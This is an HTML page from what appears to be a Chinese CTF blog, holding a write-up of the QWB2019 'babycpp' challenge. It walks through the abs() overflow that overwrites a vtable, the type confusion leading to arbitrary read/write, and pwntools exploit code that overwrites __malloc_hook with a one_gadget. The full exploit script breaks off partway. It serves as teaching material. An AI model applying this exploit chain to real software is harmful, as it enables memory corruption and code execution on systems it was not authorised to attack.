@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="ditto's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="babycpp分析:程序本身模拟两种类型的数组IntArray，StringArray.其中IntArray用来存放整形数字，StringArray用来存放字符串.有一种JS解释器中Array对象属性的表示的感觉.通过分析得到存放数组信息的结构体:12345600000000 info            struc ; (sizeof=0x28, mappedto_6)00000000 vta">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QWB2019 babycpp &amp; random复现">
+<meta property="og:url" content="http://yoursite.com/2019/09/30/QWB2019-babycpp-random复现/index.html">
+<meta property="og:site_name" content="ditto&#39;s blog">
+<meta property="og:description" content="babycpp分析:程序本身模拟两种类型的数组IntArray，StringArray.其中IntArray用来存放整形数字，StringArray用来存放字符串.有一种JS解释器中Array对象属性的表示的感觉.通过分析得到存放数组信息的结构体:12345600000000 info            struc ; (sizeof=0x28, mappedto_6)00000000 vta">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/09/30/QWB2019-babycpp-random复现/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/30/QWB2019-babycpp-random复现/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/30/QWB2019-babycpp-random复现/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/30/QWB2019-babycpp-random复现/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/30/QWB2019-babycpp-random复现/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/30/QWB2019-babycpp-random复现/6.png">
+<meta property="og:updated_time" content="2019-09-30T10:14:24.161Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="QWB2019 babycpp &amp; random复现">
+<meta name="twitter:description" content="babycpp分析:程序本身模拟两种类型的数组IntArray，StringArray.其中IntArray用来存放整形数字，StringArray用来存放字符串.有一种JS解释器中Array对象属性的表示的感觉.通过分析得到存放数组信息的结构体:12345600000000 info            struc ; (sizeof=0x28, mappedto_6)00000000 vta">
+<meta name="twitter:image" content="http://yoursite.com/2019/09/30/QWB2019-babycpp-random复现/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/30/QWB2019-babycpp-random复现/">
+
+
+
+
+
+  <title>QWB2019 babycpp & random复现 | ditto's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ditto's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/30/QWB2019-babycpp-random复现/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ditto">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/my.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ditto's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">QWB2019 babycpp & random复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-30T16:35:56+08:00">
+                2019-09-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  15
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="babycpp"><a href="#babycpp" class="headerlink" title="babycpp"></a>babycpp</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h4><p>程序本身模拟两种类型的数组IntArray，StringArray.其中IntArray用来存放整形数字，StringArray用来存放字符串.有一种JS解释器中Array对象属性的表示的感觉.<br>通过分析得到存放数组信息的结构体:<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">00000000 </span>info            struc ; (sizeof=<span class="number">0</span>x28, mappedto_6)</span><br><span class="line"><span class="symbol">00000000 </span>vtable          dq ?</span><br><span class="line"><span class="symbol">00000008 </span>hash            db <span class="number">16</span> dup(?)</span><br><span class="line"><span class="symbol">00000018 </span>hash_length     dq ?</span><br><span class="line"><span class="symbol">00000020 </span>array_ptr       dq ?</span><br><span class="line"><span class="symbol">00000028 </span>info            ends</span><br></pre></td></tr></table></figure></p>
+<h5 id="对象创建"><a href="#对象创建" class="headerlink" title="对象创建"></a>对象创建</h5><p>创建IntArray对象的构造函数:<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall IntArray(_QWORD *<span class="built_in">a1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *result<span class="comment">; // rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">BaseArray((info </span>*)<span class="built_in">a1</span>)<span class="comment">;</span></span><br><span class="line">  result = <span class="built_in">a1</span><span class="comment">;</span></span><br><span class="line">  *<span class="built_in">a1</span> = LongArrayVtable<span class="comment">;</span></span><br><span class="line">  return result<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>IntArray类继承自BaseArray类.<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">info *__fastcall <span class="keyword">BaseArray(info </span>*<span class="built_in">a1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  info *result<span class="comment">; // rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">a1</span>-&gt;vtable = (__int64)<span class="keyword">BaseArrayVtable;</span></span><br><span class="line"><span class="keyword"> </span> <span class="built_in">a1</span>-&gt;array_ptr = (__int64)malloc(<span class="number">0x80</span>uLL)<span class="comment">;</span></span><br><span class="line">  memset((void *)<span class="built_in">a1</span>-&gt;array_ptr, <span class="number">0</span>, <span class="number">0x80</span>uLL)<span class="comment">;</span></span><br><span class="line">  <span class="built_in">a1</span>-&gt;hash_length = <span class="number">16</span>LL<span class="comment">;</span></span><br><span class="line">  result = <span class="built_in">a1</span><span class="comment">;</span></span><br><span class="line">  <span class="built_in">a1</span>-&gt;hash[<span class="number">0</span>] = ArrayNumbs<span class="comment">;</span></span><br><span class="line">  return result<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>BaseArray这里malloc了一块内存用来存放数组元素，以ArrayNumbs当做hash值.<br>StringArray类和IntArray类只是重写了BaseArray的虚函数.<br>后面的Show，Edit功能都是直接调用某个对象的成员函数.</p>
+<h5 id="Edit函数"><a href="#Edit函数" class="headerlink" title="Edit函数"></a>Edit函数</h5><p>StringArray:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Input idx:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;idx);</span><br><span class="line">ptr = a1-&gt;array_ptr;</span><br><span class="line"><span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt; a1-&gt;hash_length )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(<span class="number">8L</span>L * idx + ptr) )         <span class="comment">// 如果有元素</span></span><br><span class="line">  &#123;</span><br><span class="line">    ReadString(*(StringElement **)(<span class="number">8L</span>L * idx + ptr));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Input the len of the obj:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;size);</span><br><span class="line">    <span class="keyword">if</span> ( size &lt;= <span class="number">0x100</span> &amp;&amp; size &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      element = (StringElement *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">      CreateNewStringElement(element, size);</span><br><span class="line">      v5 = element;</span><br><span class="line">      ReadString(element);</span><br><span class="line">      *(_QWORD *)(ptr + <span class="number">8L</span>L * idx) = v5;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>如果输入的idx位置为空，则用malloc一块内存，CreateNewStringElement初始化它为一个String元素，然后保存在StringArray对应的idx处<br>CreateNewStringElement:<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">StringElement </span>*__fastcall CreateNewStringElement(<span class="keyword">StringElement </span>*<span class="built_in">a1</span>, int size)</span><br><span class="line">&#123;</span><br><span class="line">  void *<span class="built_in">v2</span><span class="comment">; // rdx</span></span><br><span class="line">  <span class="keyword">StringElement </span>*result<span class="comment">; // rax</span></span><br><span class="line">  <span class="built_in">a1</span>-&gt;size = size<span class="comment">;</span></span><br><span class="line">  <span class="built_in">v2</span> = malloc(size)<span class="comment">;</span></span><br><span class="line">  result = <span class="built_in">a1</span><span class="comment">;</span></span><br><span class="line">  <span class="built_in">a1</span>-&gt;<span class="keyword">StringPtr </span>= (__int64)<span class="built_in">v2</span><span class="comment">;</span></span><br><span class="line">  return result<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里malloc一块内存用来存放真正的字符串.<br>一个String元素的结构体如下:<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">00000000 </span>StringElement   struc ; (sizeof=<span class="number">0</span>xC, mappedto_7)</span><br><span class="line"><span class="symbol">00000000 </span>StringPtr       dq ?</span><br><span class="line"><span class="symbol">00000008 </span>size            dd ?</span><br><span class="line"><span class="number">0000000</span>C StringElement   ends</span><br></pre></td></tr></table></figure></p>
+<p>创建完StringArray的视图大概如下：<br><img src="/2019/09/30/QWB2019-babycpp-random复现/1.png" alt=""></p>
+<p>IntArray:<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printf(<span class="string">"Input idx:"</span>)<span class="comment">;</span></span><br><span class="line">scanf(<span class="string">"%d"</span>, <span class="symbol">&amp;idx</span>)<span class="comment">;</span></span><br><span class="line">printf(<span class="string">"Input val:"</span>)<span class="comment">;</span></span><br><span class="line">scanf(<span class="string">"%lx"</span>, <span class="symbol">&amp;value</span>)<span class="comment">;</span></span><br><span class="line">v4 = a1-&gt;array_ptr<span class="comment">;</span></span><br><span class="line">if ( <span class="name">idx</span> &gt;= <span class="number">0</span> <span class="symbol">&amp;&amp;</span> idx &lt; a1-&gt;hash_length )</span><br><span class="line">  *(<span class="name">_QWORD</span> *)(8LL * idx + v4) = value<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
+<p>直接在对应的idx处写入数字即可.</p>
+<h5 id="Update函数"><a href="#Update函数" class="headerlink" title="Update函数:"></a>Update函数:</h5><p>Update函数用来修改某个Array的hash值<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">update</span><span class="params">(__int64 info_ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> hash; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Input idx:"</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%u"</span>, &amp;idx);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Input hash:"</span>);</span><br><span class="line">  hash = read(<span class="number">0</span>, s, <span class="number">0x10</span>uLL);</span><br><span class="line">  v3 = <span class="built_in">abs</span>(idx) % <span class="number">15</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; hash; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3 + i == <span class="number">16</span> )</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">    *(_BYTE *)(info_ptr + v3 + i + <span class="number">8</span>) = s[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>漏洞就出来abs这里，输入idx为0x80000000，abs就会发生溢出.<br>abs工作的流程如下:<br>如果是负数, ( x^( x &gt;&gt; 31 )) - (x &gt;&gt; 31)<br>负数的最高位是1，右移31为后变成0xffffffff，值为-1，一个数和-1异或 即是对该数进行按位取反操作，然后减去-1即是+1，得到该补码的数值表示.</p>
+<p>0x80000000转化为2进制即是:10000000000000000000000000000000, 跟0xffffffff异或过后得到 0x7fffffff,加上1过后又得到了0x80000000，即是一个负数，这样就可以上溢，修改当前对象的vtable</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>修改StringArray的vtable为IntArray的Vtable，即可以造成类型混淆，类似V8修改对象的Map，再Show的时候就可以打印出堆地址.<br>然后在堆上伪造一个StringElement结构，然后类型混淆修改StringArray的某个元素为这个伪造的结构的地址，这样就可以进行任意读写.<br>读取堆上保存的vtable地址，得到程序段基质，然后读取got表，获得libc的地址，接着修改__malloc_hook为one_gadget，这里需要利用realloc来调整下.</p>
+<h5 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址:"></a>泄露堆地址:</h5><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">IntVtable = '\xe0\x5c'</span><br><span class="line">StringVtable = '\x00\x5d'</span><br><span class="line">add(<span class="number">1</span>)# <span class="number">0</span> IntArray</span><br><span class="line">add(<span class="number">2</span>)# <span class="number">1</span> StringArray</span><br><span class="line">add(<span class="number">2</span>)# <span class="number">2</span> StringArray</span><br><span class="line"></span><br><span class="line">StringNewElement(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x100</span>,'A')</span><br><span class="line">UpdateHash(<span class="number">1</span>,<span class="number">0x80000000</span>,IntVtable)# 修改StringArray的vtable</span><br><span class="line">show(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">a.recvuntil(<span class="string">"is "</span>)</span><br><span class="line">heap_base = int(a.recvuntil(<span class="string">"<span class="subst">\n</span>"</span>,drop=True),<span class="number">16</span>)<span class="number">-0x120b0</span></span><br></pre></td></tr></table></figure>
+<p>先初始化StringArray的一个元素，让 *(Array_Ptr+idx)处有堆地址，然后利用类型混淆泄露出堆地址.修改vtable的时候需要爆破一个字节.</p>
+<h5 id="伪造一个StringElement结构"><a href="#伪造一个StringElement结构" class="headerlink" title="伪造一个StringElement结构:"></a>伪造一个StringElement结构:</h5><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target_addr = <span class="number">0x555555768e70</span><span class="number">-0x555555757000</span>+heap_base</span><br><span class="line">payload = p64(target_addr)</span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line">StringNewElement(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0x100</span>,payload)</span><br></pre></td></tr></table></figure>
+<p>在StringArray_1中创建一个字符串元素，写入伪造的结构.<br>然后利用类型混淆修改StringArray_0的第一个元素为这个伪造的地址:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">target_addr = <span class="number">0x555555769200</span> - <span class="number">0x555555757000</span>+heap_base</span><br><span class="line">IntEdit(<span class="number">1</span>,<span class="number">0</span>,hex(target_addr))</span><br><span class="line">UpdateHash(<span class="number">1</span>,<span class="number">0x80000000</span>,StringVtable)</span><br><span class="line">show(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">a.recvuntil(<span class="string">"tent:"</span>)</span><br><span class="line">text_base = u64(a.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x000000000201CE0</span></span><br></pre></td></tr></table></figure></p>
+<p>show得到程序段地址.<br>后面就是反复利用这个过程，泄露libc基质，然后修改__malloc_hook和realloc_hook</p>
+<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp:"></a>完整exp:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># 2.27</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">exec_file=<span class="string">"./babycpp"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">elf=ELF(exec_file,checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    a=process(exec_file)</span><br><span class="line">    <span class="keyword">if</span> context.arch == <span class="string">"i386"</span> :</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>,checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">"amd64"</span> :</span><br><span class="line">        libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>,checksec = <span class="keyword">False</span>) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(a)</span>:</span></span><br><span class="line">    text_base = a.libs()[a._cwd+a.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> a.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"libc.so.6"</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,a.libs()[key]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    text_base,libc_base=get_base(a)</span><br><span class="line">    script=<span class="string">"set 